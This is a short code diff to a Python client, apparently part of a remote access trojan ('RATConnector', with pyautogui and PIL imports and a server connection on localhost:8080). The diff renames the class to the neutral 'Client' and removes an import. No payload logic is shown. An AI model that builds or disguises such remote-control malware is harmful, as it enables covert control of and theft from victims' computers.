@@ -8,11 +8,10 @@ import ctypes
 import sys
 import pyautogui
 import PIL
-from client.commands import message
 import commands
 
 
-class RATConnector:
+class Client:
 
     # Отправляем json данные серверу
     def send_json(self, data):
@@ -126,5 +125,5 @@ class RATConnector:
 
 
 print("run")
-ratClient = RATConnector("127.0.0.1", 8080)
+ratClient = Client("127.0.0.1", 8080)
 ratClient.run()
